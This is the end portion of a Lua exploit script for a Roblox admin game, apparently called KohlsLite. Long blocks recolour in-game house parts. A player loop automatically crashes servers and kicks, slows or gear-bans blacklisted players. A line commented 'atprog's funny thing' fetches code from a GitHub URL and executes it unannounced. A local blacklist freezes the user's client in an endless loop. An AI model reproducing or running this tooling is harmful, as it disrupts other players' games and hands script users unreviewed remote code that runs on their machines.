v.Name == "SmoothBlockModel211" or v.Name == "SmoothBlockModel213" or v.Name == "SmoothBlockModel218" or v.Name == "SmoothBlockModel22" or v.Name == "SmoothBlockModel223" or v.Name == "SmoothBlockModel224" or v.Name == "SmoothBlockModel226" or v.Name == "SmoothBlockModel26" or v.Name == "SmoothBlockModel29" or v.Name == "SmoothBlockModel30" or v.Name == "SmoothBlockModel31" or v.Name == "SmoothBlockModel36" or v.Name == "SmoothBlockModel37" or v.Name == "SmoothBlockModel38" or v.Name == "SmoothBlockModel39" or v.Name == "SmoothBlockModel41" or v.Name == "SmoothBlockModel48" or v.Name == "SmoothBlockModel49" or v.Name == "SmoothBlockModel51" or v.Name == "SmoothBlockModel56" or v.Name == "SmoothBlockModel67" or v.Name == "SmoothBlockModel68" or v.Name == "SmoothBlockModel69" or v.Name == "SmoothBlockModel70" or v.Name == "SmoothBlockModel72" or v.Name == "SmoothBlockModel75" or v.Name == "SmoothBlockModel8" or v.Name == "SmoothBlockModel81" or v.Name == "SmoothBlockModel85" or v.Name == "SmoothBlockModel93" or v.Name == "SmoothBlockModel98" then
						colorAPI.color(v, wallsC) -- Default is "Brick yellow"
					end -- House walls
 
					if v.Name == "SmoothBlockModel40" then
						colorAPI.color(v, baseC) -- Default is "Bright green"
					end -- House grass base
 
					if v.Name == "SmoothBlockModel100" or v.Name == "SmoothBlockModel102" or v.Name == "SmoothBlockModel104" or v.Name == "SmoothBlockModel107" or v.Name == "SmoothBlockModel109" or v.Name == "SmoothBlockModel110" or v.Name == "SmoothBlockModel111" or v.Name == "SmoothBlockModel119" or v.Name == "SmoothBlockModel12" or v.Name == "SmoothBlockModel120" or v.Name == "SmoothBlockModel123" or v.Name == "SmoothBlockModel124" or v.Name == "SmoothBlockModel125" or v.Name == "SmoothBlockModel127" or v.Name == "SmoothBlockModel128" or v.Name == "SmoothBlockModel133" or v.Name == "SmoothBlockModel136" or v.Name == "SmoothBlockModel137" or v.Name == "SmoothBlockModel138" or v.Name == "SmoothBlockModel139" or v.Name == "SmoothBlockModel141" or v.Name == "SmoothBlockModel143" or v.Name == "SmoothBlockModel149" or v.Name == "SmoothBlockModel151" or v.Name == "SmoothBlockModel152" or v.Name == "SmoothBlockModel153" or v.Name == "SmoothBlockModel156" or v.Name == "SmoothBlockModel157" or v.Name == "SmoothBlockModel158" or v.Name == "SmoothBlockModel16" or v.Name == "SmoothBlockModel163" or v.Name == "SmoothBlockModel167" or v.Name == "SmoothBlockModel168" or v.Name == "SmoothBlockModel169" or v.Name == "SmoothBlockModel17" or v.Name == "SmoothBlockModel170" or v.Name == "SmoothBlockModel172" or v.Name == "SmoothBlockModel177" or v.Name == "SmoothBlockModel18" or v.Name == "SmoothBlockModel180" or v.Name == "SmoothBlockModel184" or v.Name == "SmoothBlockModel187" or v.Name == "SmoothBlockModel188" or v.Name == "SmoothBlockModel189" or v.Name == "SmoothBlockModel19" or v.Name == "SmoothBlockModel193" or v.Name == "SmoothBlockModel2" or v.Name == "SmoothBlockModel200" or v.Name == "SmoothBlockModel202" or v.Name == "SmoothBlockModel21" or v.Name == "SmoothBlockModel214" or v.Name == "SmoothBlockModel215" or v.Name == "SmoothBlockModel216" or v.Name == "SmoothBlockModel219" or v.Name == "SmoothBlockModel220" or v.Name == "SmoothBlockModel221" or v.Name == "SmoothBlockModel222" or v.Name == "SmoothBlockModel225" or v.Name == "SmoothBlockModel227" or v.Name == "SmoothBlockModel229" or v.Name == "SmoothBlockModel23" or v.Name == "SmoothBlockModel230" or v.Name == "SmoothBlockModel231" or v.Name == "SmoothBlockModel25" or v.Name == "SmoothBlockModel28" or v.Name == "SmoothBlockModel32" or v.Name == "SmoothBlockModel33" or v.Name == "SmoothBlockModel34" or v.Name == "SmoothBlockModel42" or v.Name == "SmoothBlockModel44" or v.Name == "SmoothBlockModel47" or v.Name == "SmoothBlockModel54" or v.Name == "SmoothBlockModel55" or v.Name == "SmoothBlockModel58" or v.Name == "SmoothBlockModel59" or v.Name == "SmoothBlockModel6" or v.Name == "SmoothBlockModel61" or v.Name == "SmoothBlockModel62" or v.Name == "SmoothBlockModel63" or v.Name == "SmoothBlockModel74" or v.Name == "SmoothBlockModel76" or v.Name == "SmoothBlockModel77" or v.Name == "SmoothBlockModel78" or v.Name == "SmoothBlockModel79" or v.Name == "SmoothBlockModel80" or v.Name == "SmoothBlockModel84" or v.Name == "SmoothBlockModel86" or v.Name == "SmoothBlockModel87" or v.Name == "SmoothBlockModel88" or v.Name == "SmoothBlockModel90" or v.Name == "SmoothBlockModel91" or v.Name == "SmoothBlockModel92" or v.Name == "SmoothBlockModel94" or v.Name == "SmoothBlockModel95" or v.Name == "SmoothBlockModel96" then
						colorAPI.color(v, roofC) -- Default is "Bright red"
					end -- House roof
 
					if v.Name == "SmoothBlockModel10" or v.Name == "SmoothBlockModel101" or v.Name == "SmoothBlockModel117" or v.Name == "SmoothBlockModel121" or v.Name == "SmoothBlockModel144" or v.Name == "SmoothBlockModel145" or v.Name == "SmoothBlockModel146" or v.Name == "SmoothBlockModel148" or v.Name == "SmoothBlockModel150" or v.Name == "SmoothBlockModel159" or v.Name == "SmoothBlockModel161" or v.Name == "SmoothBlockModel171" or v.Name == "SmoothBlockModel174" or v.Name == "SmoothBlockModel175" or v.Name == "SmoothBlockModel181" or v.Name == "SmoothBlockModel182" or v.Name == "SmoothBlockModel183" or v.Name == "SmoothBlockModel192" or v.Name == "SmoothBlockModel194" or v.Name == "SmoothBlockModel195" or v.Name == "SmoothBlockModel199" or v.Name == "SmoothBlockModel204" or v.Name == "SmoothBlockModel206" or v.Name == "SmoothBlockModel212" or v.Name == "SmoothBlockModel217" or v.Name == "SmoothBlockModel228" or v.Name == "SmoothBlockModel24" or v.Name == "SmoothBlockModel27" or v.Name == "SmoothBlockModel35" or v.Name == "SmoothBlockModel4" or v.Name == "SmoothBlockModel43" or v.Name == "SmoothBlockModel45" or v.Name == "SmoothBlockModel46" or v.Name == "SmoothBlockModel50" or v.Name == "SmoothBlockModel53" or v.Name == "SmoothBlockModel57" or v.Name == "SmoothBlockModel60" or v.Name == "SmoothBlockModel64" or v.Name == "SmoothBlockModel65" or v.Name == "SmoothBlockModel66" or v.Name == "SmoothBlockModel7" or v.Name == "SmoothBlockModel71" or v.Name == "SmoothBlockModel73" or v.Name == "SmoothBlockModel82" or v.Name == "SmoothBlockModel83" or v.Name == "SmoothBlockModel89" or v.Name == "SmoothBlockModel99" then
						colorAPI.color(v, WANDDC) -- Default is "Dark orange"
					end -- House windows and door outlines
 
					if v.Name == "SmoothBlockModel1" or v.Name == "SmoothBlockModel3" or v.Name == "SmoothBlockModel5" or v.Name == "SmoothBlockModel9" then
						colorAPI.color(v, stairsC) -- Default is "Dark stone grey"
					end -- House Stairs
 
					if v.Name == "SmoothBlockModel112" then
						colorAPI.color(v, floorC) -- Default is "Medium blue"
					end -- House floor
 
					if v.Name == "SmoothBlockModel52" or v.Name == "SmoothBlockModel97" then
						colorAPI.color(v, rooftsC) -- Default is "Reddish brown"
					end -- House roof thingys
 
					if v.Name == "SmoothBlockModel160" or v.Name == "SmoothBlockModel162" or v.Name == "SmoothBlockModel165" or v.Name == "SmoothBlockModel178" then
						colorAPI.color(v, chiC) -- Default is "Sand red"
					end -- Chi top part
			end)()
		end
end


colorAPI.colorHouse_2 = function(Extra)
		local OutlinesAndWDWS = Extra.WANDDC
		local Walls = Extra.wallsC
		local Roof = Extra.roofC
		local ChimneyTopParts = Extra.chiC
		for i,v in pairs(workspace.Terrain._Game.Workspace["Basic House"]:GetChildren()) do
			coroutine.resume(coroutine.create(function()
				if v.Name == "SmoothBlockModel103" or v.Name == "SmoothBlockModel105" or v.Name == "SmoothBlockModel106" or v.Name == "SmoothBlockModel108" or v.Name == "SmoothBlockModel11" or v.Name == "SmoothBlockModel113" or v.Name == "SmoothBlockModel114" or v.Name == "SmoothBlockModel115" or v.Name == "SmoothBlockModel116" or v.Name == "SmoothBlockModel118" or v.Name == "SmoothBlockModel122" or v.Name == "SmoothBlockModel126" or v.Name == "SmoothBlockModel129" or v.Name == "SmoothBlockModel13" or v.Name == "SmoothBlockModel130" or v.Name == "SmoothBlockModel131" or v.Name == "SmoothBlockModel132" or v.Name == "SmoothBlockModel134" or v.Name == "SmoothBlockModel135" or v.Name == "SmoothBlockModel14" or v.Name == "SmoothBlockModel140" or v.Name == "SmoothBlockModel142" or v.Name == "SmoothBlockModel147" or v.Name == "SmoothBlockModel15" or v.Name == "SmoothBlockModel154" or v.Name == "SmoothBlockModel155" or v.Name == "SmoothBlockModel164" or v.Name == "SmoothBlockModel166" or v.Name == "SmoothBlockModel173" or v.Name == "SmoothBlockModel176" or v.Name == "SmoothBlockModel179" or v.Name == "SmoothBlockModel185" or v.Name == "SmoothBlockModel186" or v.Name == "SmoothBlockModel190" or v.Name == "SmoothBlockModel191" or v.Name == "SmoothBlockModel196" or v.Name == "SmoothBlockModel197" or v.Name == "SmoothBlockModel198" or v.Name == "SmoothBlockModel20" or v.Name == "SmoothBlockModel201" or v.Name == "SmoothBlockModel203" or v.Name == "SmoothBlockModel205" or v.Name == "SmoothBlockModel207" or v.Name == "SmoothBlockModel208" or v.Name == "SmoothBlockModel209" or v.Name == "SmoothBlockModel210" or v.Name == "SmoothBlockModel211" or v.Name == "SmoothBlockModel213" or v.Name == "SmoothBlockModel218" or v.Name == "SmoothBlockModel22" or v.Name == "SmoothBlockModel223" or v.Name == "SmoothBlockModel224" or v.Name == "SmoothBlockModel226" or v.Name == "SmoothBlockModel26" or v.Name == "SmoothBlockModel29" or v.Name == "SmoothBlockModel30" or v.Name == "SmoothBlockModel31" or v.Name == "SmoothBlockModel36" or v.Name == "SmoothBlockModel37" or v.Name == "SmoothBlockModel38" or v.Name == "SmoothBlockModel39" or v.Name == "SmoothBlockModel41" or v.Name == "SmoothBlockModel48" or v.Name == "SmoothBlockModel49" or v.Name == "SmoothBlockModel51" or v.Name == "SmoothBlockModel56" or v.Name == "SmoothBlockModel67" or v.Name == "SmoothBlockModel68" or v.Name == "SmoothBlockModel69" or v.Name == "SmoothBlockModel70" or v.Name == "SmoothBlockModel72" or v.Name == "SmoothBlockModel75" or v.Name == "SmoothBlockModel8" or v.Name == "SmoothBlockModel81" or v.Name == "SmoothBlockModel85" or v.Name == "SmoothBlockModel93" or v.Name == "SmoothBlockModel98" then
					colorAPI.color_2(v,Walls[1], Walls[2], Walls[3])
				end
				if v.Name == "SmoothBlockModel10" or v.Name == "SmoothBlockModel101" or v.Name == "SmoothBlockModel117" or v.Name == "SmoothBlockModel121" or v.Name == "SmoothBlockModel144" or v.Name == "SmoothBlockModel145" or v.Name == "SmoothBlockModel146" or v.Name == "SmoothBlockModel148" or v.Name == "SmoothBlockModel150" or v.Name == "SmoothBlockModel159" or v.Name == "SmoothBlockModel161" or v.Name == "SmoothBlockModel171" or v.Name == "SmoothBlockModel174" or v.Name == "SmoothBlockModel175" or v.Name == "SmoothBlockModel181" or v.Name == "SmoothBlockModel182" or v.Name == "SmoothBlockModel183" or v.Name == "SmoothBlockModel192" or v.Name == "SmoothBlockModel194" or v.Name == "SmoothBlockModel195" or v.Name == "SmoothBlockModel199" or v.Name == "SmoothBlockModel204" or v.Name == "SmoothBlockModel206" or v.Name == "SmoothBlockModel212" or v.Name == "SmoothBlockModel217" or v.Name == "SmoothBlockModel228" or v.Name == "SmoothBlockModel24" or v.Name == "SmoothBlockModel27" or v.Name == "SmoothBlockModel35" or v.Name == "SmoothBlockModel4" or v.Name == "SmoothBlockModel43" or v.Name == "SmoothBlockModel45" or v.Name == "SmoothBlockModel46" or v.Name == "SmoothBlockModel50" or v.Name == "SmoothBlockModel53" or v.Name == "SmoothBlockModel57" or v.Name == "SmoothBlockModel60" or v.Name == "SmoothBlockModel64" or v.Name == "SmoothBlockModel65" or v.Name == "SmoothBlockModel66" or v.Name == "SmoothBlockModel7" or v.Name == "SmoothBlockModel71" or v.Name == "SmoothBlockModel73" or v.Name == "SmoothBlockModel82" or v.Name == "SmoothBlockModel83" or v.Name == "SmoothBlockModel89" or v.Name == "SmoothBlockModel99" then
					colorAPI.color_2(v,OutlinesAndWDWS[1],OutlinesAndWDWS[2],OutlinesAndWDWS[3])
				end
				if v.Name == "SmoothBlockModel100" or v.Name == "SmoothBlockModel102" or v.Name == "SmoothBlockModel104" or v.Name == "SmoothBlockModel107" or v.Name == "SmoothBlockModel109" or v.Name == "SmoothBlockModel110" or v.Name == "SmoothBlockModel111" or v.Name == "SmoothBlockModel119" or v.Name == "SmoothBlockModel12" or v.Name == "SmoothBlockModel120" or v.Name == "SmoothBlockModel123" or v.Name == "SmoothBlockModel124" or v.Name == "SmoothBlockModel125" or v.Name == "SmoothBlockModel127" or v.Name == "SmoothBlockModel128" or v.Name == "SmoothBlockModel133" or v.Name == "SmoothBlockModel136" or v.Name == "SmoothBlockModel137" or v.Name == "SmoothBlockModel138" or v.Name == "SmoothBlockModel139" or v.Name == "SmoothBlockModel141" or v.Name == "SmoothBlockModel143" or v.Name == "SmoothBlockModel149" or v.Name == "SmoothBlockModel151" or v.Name == "SmoothBlockModel152" or v.Name == "SmoothBlockModel153" or v.Name == "SmoothBlockModel156" or v.Name == "SmoothBlockModel157" or v.Name == "SmoothBlockModel158" or v.Name == "SmoothBlockModel16" or v.Name == "SmoothBlockModel163" or v.Name == "SmoothBlockModel167" or v.Name == "SmoothBlockModel168" or v.Name == "SmoothBlockModel169" or v.Name == "SmoothBlockModel17" or v.Name == "SmoothBlockModel170" or v.Name == "SmoothBlockModel172" or v.Name == "SmoothBlockModel177" or v.Name == "SmoothBlockModel18" or v.Name == "SmoothBlockModel180" or v.Name == "SmoothBlockModel184" or v.Name == "SmoothBlockModel187" or v.Name == "SmoothBlockModel188" or v.Name == "SmoothBlockModel189" or v.Name == "SmoothBlockModel19" or v.Name == "SmoothBlockModel193" or v.Name == "SmoothBlockModel2" or v.Name == "SmoothBlockModel200" or v.Name == "SmoothBlockModel202" or v.Name == "SmoothBlockModel21" or v.Name == "SmoothBlockModel214" or v.Name == "SmoothBlockModel215" or v.Name == "SmoothBlockModel216" or v.Name == "SmoothBlockModel219" or v.Name == "SmoothBlockModel220" or v.Name == "SmoothBlockModel221" or v.Name == "SmoothBlockModel222" or v.Name == "SmoothBlockModel225" or v.Name == "SmoothBlockModel227" or v.Name == "SmoothBlockModel229" or v.Name == "SmoothBlockModel23" or v.Name == "SmoothBlockModel230" or v.Name == "SmoothBlockModel231" or v.Name == "SmoothBlockModel25" or v.Name == "SmoothBlockModel28" or v.Name == "SmoothBlockModel32" or v.Name == "SmoothBlockModel33" or v.Name == "SmoothBlockModel34" or v.Name == "SmoothBlockModel42" or v.Name == "SmoothBlockModel44" or v.Name == "SmoothBlockModel47" or v.Name == "SmoothBlockModel54" or v.Name == "SmoothBlockModel55" or v.Name == "SmoothBlockModel58" or v.Name == "SmoothBlockModel59" or v.Name == "SmoothBlockModel6" or v.Name == "SmoothBlockModel61" or v.Name == "SmoothBlockModel62" or v.Name == "SmoothBlockModel63" or v.Name == "SmoothBlockModel74" or v.Name == "SmoothBlockModel76" or v.Name == "SmoothBlockModel77" or v.Name == "SmoothBlockModel78" or v.Name == "SmoothBlockModel79" or v.Name == "SmoothBlockModel80" or v.Name == "SmoothBlockModel84" or v.Name == "SmoothBlockModel86" or v.Name == "SmoothBlockModel87" or v.Name == "SmoothBlockModel88" or v.Name == "SmoothBlockModel90" or v.Name == "SmoothBlockModel91" or v.Name == "SmoothBlockModel92" or v.Name == "SmoothBlockModel94" or v.Name == "SmoothBlockModel95" or v.Name == "SmoothBlockModel96" then
					colorAPI.color_2(v,Roof[1],Roof[2],Roof[3])
				end
				if v.Name == "SmoothBlockModel160" or v.Name == "SmoothBlockModel165" or v.Name == "SmoothBlockModel178" or v.Name == "SmoothBlockModel162" then
					colorAPI.color_2(v,ChimneyTopParts[1],ChimneyTopParts[2],ChimneyTopParts[3])
				end
				if v.Name == "SmoothBlockModel1" or v.Name == "SmoothBlockModel5" or v.Name == "SmoothBlockModel3" or v.Name == "SmoothBlockModel9" then
					colorAPI.color_2(v,Extra.stairsC[1],Extra.stairsC[2],Extra.stairsC[3])
				end
				if v.Name == "SmoothBlockModel97" or v.Name == "SmoothBlockModel52" then
					colorAPI.color_2(v,Extra.rooftsC[1],Extra.rooftsC[2],Extra.rooftsC[3])
				end
			end))
		end
		colorAPI.color_2(workspace.Terrain["_Game"].Workspace["Basic House"].SmoothBlockModel40,Extra.baseC[1],Extra.baseC[2],Extra.baseC[3])
		colorAPI.color_2(workspace.Terrain._Game.Workspace["Basic House"].SmoothBlockModel112,Extra.floorC[1],Extra.floorC[2],Extra.floorC[3])
end

colorAPI.colorBuildingBricks = function(arg)
		local DarkStoneGrey = arg.DarkStoneGrey
		local DeepBlue = arg.DeepBlue
		local NY = arg.NY
		local IW = arg.IW
		local LimeGreen = arg.LimeGreen
		local MSG = arg.MSG
		local RB = arg.RB
		local RR = arg.RR
		local TP = arg.TP
 
		-------------------------------------------------------------------- Building Bricks --------------------------------------------------------------------
 
		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Building Bricks"]:GetChildren()) do
			coroutine.wrap(function()
				if v.Name == "Part29" or v.Name == "Part31" or v.Name == "Part55" then
					colorAPI.color(v, DarkStoneGrey) -- Default is "Dark stone grey"
				end
 
				if v.Name == "Part11" or v.Name == "Part18" or v.Name == "Part25" or v.Name == "Part3" or v.Name == "Part43" then
					colorAPI.color(v, DeepBlue) -- Default is "Deep blue"
				end
 
				if v.Name == "Part12" or v.Name == "Part15" or v.Name == "Part24" or v.Name == "Part44" or v.Name == "Part6" then
					colorAPI.color(v, NY) -- Default is "New Yeller"
				end
 
				if v.Name == "Part13" or v.Name == "Part21" or v.Name == "Part23" or v.Name == "Part7" then
					colorAPI.color(v, IW) -- Default is "Institutional white"
				end
 
				if v.Name == "Part17" or v.Name == "Part26" or v.Name == "Part38" or v.Name == "Part9" or v.Name == "Part5" then
					colorAPI.color(v, LimeGreen) -- Default is "Lime green"
				end
 
				if v.Name == "Part30" or v.Name == "Part32" or v.Name == "Part33" or v.Name == "Part34" or v.Name == "Part35" or v.Name == "Part36" or v.Name == "Part39" or v.Name == "Part40" or v.Name == "Part41" or v.Name == "Part42" or v.Name == "Part46" or v.Name == "Part47" or v.Name == "Part48" or v.Name == "Part49" or v.Name == "Part50" or v.Name == "Part51" or v.Name == "Part52" or v.Name == "Part53" or v.Name == "Part54" or v.Name == "Part56" or v.Name == "Part57" or v.Name == "Part58" or v.Name == "Part59" or v.Name == "Part60" or v.Name == "Part61" then
					colorAPI.color(v, MSG) -- Default is "Medium Stone grey"
				end
 
				if v.Name == "Part14" or v.Name == "Part19" or v.Name == "Part2" or v.Name == "Part27" then
					colorAPI.color(v, RB) -- Default is "Really black"
				end
 
				if v.Name == "Part1" or v.Name == "Part10" or v.Name == "Part16" or v.Name == "Part22" or v.Name == "Part37" then
					colorAPI.color(v, RR) -- Default is "Really red"
				end
 
				if v.Name == "Part20" or v.Name == "Part28" or v.Name == "Part4" or v.Name == "Part45" or v.Name == "Part8" then
					colorAPI.color(v, TP) -- Default is "Toothpaste"
				end
			end)()
		end
end

colorAPI.colorBuildingBricks_2 = function(Extra)
		local DarkStoneGrey = Extra.DarkStoneGrey
		local DeepBlue = Extra.DeepBlue
		local NY = Extra.NY
		local IW = Extra.IW
		local LimeGreen = Extra.LimeGreen
		local MSG = Extra.MSG
		local RB = Extra.RB
		local TP = Extra.TP
		local RR = Extra.RR
		for i,v in pairs(workspace.Terrain._Game.Workspace["Building Bricks"]:GetChildren()) do
			coroutine.resume(coroutine.create(function()
				if v.Name == "Part31" or v.Name == "Part29" or v.Name == "Part55" then
					colorAPI.color_2(v,DarkStoneGrey[1],DarkStoneGrey[2],DarkStoneGrey[3])
				elseif v.Name == "Part43" or v.Name == "Part3" or v.Name == "Part25" or v.Name == "Part18" or v.Name == "Part11" then
					colorAPI.color_2(v,DeepBlue[1],DeepBlue[2],DeepBlue[3])
				elseif v.Name == "Part44" or v.Name == "Part6" or v.Name == "Part24" or v.Name == "Part15" or v.Name == "Part12" then
					colorAPI.color_2(v,NY[1],NY[2],NY[3])
				elseif v.Name == "Part7" or v.Name == "Part13" or v.Name == "Part21" or v.Name == "Part23" then
					colorAPI.color_2(v,IW[1], IW[2], IW[3])
				elseif v.Name == "Part5" or v.Name == "Part9" or v.Name == "Part17" or v.Name == "Part26" or v.Name == "Part38" then
					colorAPI.color_2(v,LimeGreen[1], LimeGreen[2], LimeGreen[3])
				elseif v.Name == "Part2" or v.Name == "Part14" or v.Name == "Part19" or v.Name == "Part27" then
					colorAPI.color_2(v,RB[1], RB[2], RB[3])
				elseif v.Name == "Part1" or v.Name == "Part10" or v.Name == "Part16" or v.Name == "Part22" or v.Name == "Part37" then
					colorAPI.color_2(v,RR[1], RR[2], RR[3])
				elseif v.Name == "Part45" or v.Name == "Part4" or v.Name == "Part8" or v.Name == "Part20" or v.Name == "Part28" then
					colorAPI.color_2(v,TP[1], TP[2], TP[3])
				else
					colorAPI.color_2(v,MSG[1], MSG[2], MSG[3])
				end
			end))
		end
end

-- Player stuff
for i, v in pairs(game.Players:GetPlayers()) do

        if v.Name == "9jn" or v.Name == "9gn" then
                        antiraygun = true
        end

        if table.find(crash_on_sight, v.Name) then
                Chat("h \n\n\n Server automatically crashed due to blacklisted user ("..v.Name..") being in the server. \n\n\n")
                print(v.Name.." is in the server. Server was automatically crashed as they are blacklisted.")
                DCrash()  
        end

        if table.find(rkick_on_sight, v.Name) then
                Chat("h \n\n\n Auto rocket kicking "..v.Name.." as they are blacklisted. \n\n\n")
                rkickplr(v, v.Name)
        end

        if table.find(suser_on_sight, v.Name) then
                Chat("h \n\n\n Auto slowing "..player.Name.." as they are blacklisted. \n\n\n")
                table.insert(carcar, v.Name)
        end

        if table.find(mkick_on_sight, v.Name) then
                Chat("h \n\n\n Auto message kicking "..v.Name.." as they are blacklisted. \n\n\n")
                antichatplr = true
                acplr = v.Name
        end

        if table.find(furry_on_sight, v.Name) then
                Chat(prefix.."char "..v.Name.." furry")
        end

        if table.find(gb_on_sight, v.Name) then 
                xplr = player
                xplayer = player.Name
                Gearban()
        end

        task.wait(0)
        PLRSTART(v)
end

-- These run last to prevent bugs
startupScripts()

print([[
___  __    ________  ___  ___  ___       ________  ___       ___  _________  _______      
|\  \|\  \ |\   __  \|\  \|\  \|\  \     |\   ____\|\  \     |\  \|\___   ___\\  ___ \     
\ \  \/  /|\ \  \|\  \ \  \\\  \ \  \    \ \  \___|\ \  \    \ \  \|___ \  \_\ \   __/|    
 \ \   ___  \ \  \\\  \ \   __  \ \  \    \ \_____  \ \  \    \ \  \   \ \  \ \ \  \_|/__  
  \ \  \\ \  \ \  \\\  \ \  \ \  \ \  \____\|____|\  \ \  \____\ \  \   \ \  \ \ \  \_|\ \ 
   \ \__\\ \__\ \_______\ \__\ \__\ \_______\____\_\  \ \_______\ \__\   \ \__\ \ \_______\
    \|__| \|__|\|_______|\|__|\|__|\|_______|\_________\|_______|\|__|    \|__|  \|_______| 
                                            \|_________|                           
]])

Stats.loadedtime = string.format("%.2f", os.clock() - Stats.starttime)

print("\n\n\n")
print("- Debug information -")
print("Loaded in " .. Stats.loadedtime .. "ms.")

-- KohlsLite Tags - Created by atprog
local OWNER = {
	"ScriptingProgrammer", 
	"me_123eq", 
	"s_pisafurry", 
	"kohlslitedev", 
	"IceStuds", 
        "yeyeyeweweweye"
}

local DEVELOPER = {
   "atprog",
 --  "IceStuds" (avoid overlap)
}

local ADMIN = {
    "decryptionites",
    "minecraftgamer2012YT",
    "clydekash",
    "ripcxo",
    "grimAuxiliatrix",
    "undertaker629",
   -- "dawninja21",
  --  "dawninja21alt",
    "jjjuuikjjikkju"
}

-- Loading (from pqko and others) --
local function rankcheck(username)
    if table.find(OWNER, username) then
        return "Owner"
    elseif table.find(DEVELOPER, username) then
	return "Developer"
    elseif table.find(ADMIN, username) then
	return "Admin"
    else
        return "Member"
    end
end

Stats.username = game.Players.LocalPlayer.Name
Stats.rank = rankcheck(Stats.username)

print("Your rank is: " .. Stats.rank)

-- atprog's funny thing ...
loadstring(game:HttpGet("https://raw.githubusercontent.com/blueskykah/soggy/main/for%20atpoop"))()

local function createBillboardGui(text, color)
    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Size = UDim2.new(0, 100, 0, 50)
    billboardGui.StudsOffset = Vector3.new(0, 3, 0)
    billboardGui.Adornee = nil

    local textLabel = Instance.new("TextLabel", billboardGui)
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = text
    textLabel.TextColor3 = color
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.ArialBold

    return billboardGui
end

local function addGuiToPlayer(player)
    local text, color

    if table.find(OWNER, player.Name) then
        text = "KL OWNER"
        color = Color3.new(0, 0, 1)
    elseif table.find(DEVELOPER, player.Name) then
        text = "KL DEVELOPER"
        color = Color3.new(0.5, 0, 0.5)
    elseif table.find(ADMIN, player.Name) then
        text = "KL ADMIN"
        color = Color3.new(1, 0, 0)
    end

    if text and color then
        player.CharacterAdded:Connect(function(character)
            local head = character:WaitForChild("Head")
            if player ~= game.Players.LocalPlayer then
                local billboardGui = createBillboardGui(text, color)
                billboardGui.Adornee = head
                billboardGui.Parent = head
            end
        end)

        if player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head and player ~= game.Players.LocalPlayer then
                local billboardGui = createBillboardGui(text, color)
                billboardGui.Adornee = head
                billboardGui.Parent = head
            end
        end
    end
end

game.Players.PlayerAdded:Connect(function(player)
    addGuiToPlayer(player)
end)

for _, player in pairs(game.Players:GetPlayers()) do
    addGuiToPlayer(player)
end

-- KohlsLite Blacklist --
local unexecuteables = {"Temporary123516","aliihsan12345Bloxy","XxSmurfXxSmurfXx","kjnjsknsdgkgnfgkjknf","NOTAVIRTUALMACHINE15"}
if table.find(unexecuteables, game.Players.LocalPlayer.Name) then
		if setclipboard then
			setclipboard("dm ts2021	on discord")
		end
                pcall(function() -- thanks tech
		        game.Players.LocalPlayer:Kick("[KohlsLite]: You have been blacklisted from KohlsLite. Contact ts2021 to contest this.") 
                end)
                task.wait(2.5); while true do end
end

local atprogcakeday = "08/23" -- atprog's birthday
local spcakeday = "04/28" --

local ctime = os.date("%m/%d")

if ctime == atprogcakeday then			
	Remind("It's atprog birthday! If you see him, do .cakeday!")
elseif ctime == spcakeday then
	Remind("It's my birthday! If you see me, do .cakeday!")
else
	-- funny filler
end

if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 883283806) then
        purchased_kl = true 
else
	purchased_kl = false
end

if purchased_kl or table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) then
	-- filler
else
	Remind("Support my script by buying my gamepass! Just do .purchase.")
end

Remind("me when discord limits me till 26/9/24 for repling to someone saying cee pee... just like tech :p")

--[[
Things to add/fix. Feel free to fix these and send the code and I'll credit you
-> Visualiser and drawer
-> Boombox visualiser
-> Part builder
-> Object mover (cmd pi version)
-> Fix ncontrol
-> Can't fix these until I get a windows PC, this might be a long time... ;(
]]

-- KohlsLite on top
-- Information about KohlsLite is at the top of the script
